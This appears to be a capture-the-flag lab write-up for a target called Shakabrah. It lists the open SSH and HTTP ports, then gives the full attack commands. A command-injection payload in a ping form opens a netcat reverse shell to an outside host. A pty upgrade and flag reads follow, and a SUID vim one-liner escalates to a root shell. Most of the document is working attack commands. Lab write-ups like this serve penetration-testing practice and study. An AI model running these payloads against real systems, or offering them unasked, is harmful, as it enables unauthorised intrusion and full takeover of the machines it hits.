# Shakabrah

**IP Address:** 192.168.178.86

## Enumeration
### Open Ports
| Port #| Service | Details  |
|:------|:---------|:---------|
| 22    | ssh      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80    | http     | Apache httpd 2.4.29 ((Ubuntu)) |

## Exploitation
### Exploit Details (Command injection)
* **Name** - Command injection
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

The default webpage has a ping command that can be leveraged for command injection. 

Commands
```bash
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.178 80 >/tmp/f
python3 -c 'import pty;pty.spawn("/bin/bash")'
whoami
cat /home/dylan/local.txt
```
![Set Options](images/exploit1.png)

![Set Options](images/exploit2.png)

## Privilege Escalation
### Exploit Details (SUID (vim))
* **Name** - SUID (vim)
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

Commands
```bash
/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
whoami
cat /root/proof.txt
```

![Execute Exploit](images/privesc1.png)

![Execute Exploit](images/privesc2.png)

![Execute Exploit](images/privesc3.png)